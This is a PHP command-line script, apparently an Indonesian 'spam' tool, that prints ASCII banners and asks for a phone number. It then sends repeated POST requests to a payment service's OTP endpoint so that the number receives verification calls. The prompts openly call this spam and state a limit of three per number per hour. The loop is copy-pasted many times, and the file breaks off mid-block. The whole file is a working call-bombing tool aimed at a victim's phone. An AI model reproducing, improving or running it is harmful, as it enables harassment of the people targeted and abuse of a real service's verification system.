<?php
system('clear');
sleep(1);
echo "\033[91m
  ███████\033[97m╗\033[91m██████\033[97m╗  \033[91m█████\033[97m╗ \033[91m███\033[97m╗   \033[91m███\033[97m╗             
  \033[91m██\033[97m╔════╝\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m██\033[97m╔══\033[91m██\033[97m╗\033[91m████\033[97m╗ \033[91m████\033[97m║    
  \033[91m███████\033[97m╗\033[91m██████\033[97m╔╝\033[91m███████\033[97m║\033[91m██\033[97m╔\033[91m████\033[97m╔\033[91m██\033[97m║
  \033[97m╚════\033[91m██\033[97m║\033[91m██\033[97m╔═══╝ \033[91m██\033[97m╔══\033[91m██\033[97m║\033[91m██\033[97m║╚\033[91m██\033[97m╔╝\033[91m██\033[97m║
  \033[91m███████\033[97m║\033[91m██\033[97m║     \033[91m██\033[97m║  \033[91m██\033[97m║\033[91m██\033[97m║ ╚═╝ \033[91m██\033[97m║     
  \033[97m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝        
                   \033[97m██████\033[91m╗ \033[97m█████\033[91m╗ \033[97m██\033[91m╗     \033[97m██\033[91m╗    \033[92m®
                  \033[97m██\033[91m╔════╝\033[97m██\033[91m╔══\033[97m██\033[91m╗\033[97m██\033[91m║     \033[97m██\033[91m║   
                  \033[97m██\033[91m║     \033[97m███████\033[91m║\033[97m██\033[91m║     \033[97m██\033[91m║     
                  \033[97m██\033[91m║     \033[97m██\033[91m╔══\033[97m██\033[91m║\033[97m██\033[91m║     \033[97m██\033[91m║     
                  \033[91m╚\033[97m██████\033[91m╗\033[97m██\033[91m║  \033[97m██\033[91m║\033[97m███████\033[91m╗\033[97m███████\033[91m╗
                   ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝\n";
sleep(5);
system('clear');
$banner = "
             
 \033[95m╔════════════════════════════════════════════════╗
\033[95m ║    \033[97m×\033[91m───────────────────────────────────────\033[97m×   \033[95m║
 \033[95m╠═\033[97m> \033[94mAuthor \033[93m: \033[92mDin-zUgex95                         \033[95m║ 
 \033[95m╠═\033[97m> \033[94mGithub \033[93m: \033[92mhttps://github.com/Din-zUgex95      \033[95m║
 \033[95m╠═\033[97m> \033[94mBlog \033[93m  : \033[92mendinaenudin95.blogspot.com         \033[95m║
\033[95m ║    \033[97m×\033[91m───────────────────────────────────────\033[97m×   \033[95m║
 \033[95m╚════════════════════════════════════════════════╝\n";

system('clear');
echo $banner;
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
  $asw = curl_exec($ch);
        curl_close($ch);
        //echo $asw."\n";
        if (preg_match('/otp_attempt_left/', $asw)) {
                echo "\033[92m     _               _               _ _
    | |__   ___ _ __| |__   __ _ ___(_) |
    | '_ \ / _ \ '__| '_ \ / _` / __| | |
    | |_) |  __/ |  | | | | (_| \__ \ | |
    |_.__/ \___|_|  |_| |_|\__,_|___/_|_|\n\n";
        }else{
                echo "\033[91m                             _
      __ _  __ _  __ _  __ _| |
     / _` |/ _` |/ _` |/ _` | |
    | (_| | (_| | (_| | (_| | |
     \__, |\__,_|\__, |\__,_|_|
     |___/       |___/\n\n";
        }
}

system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
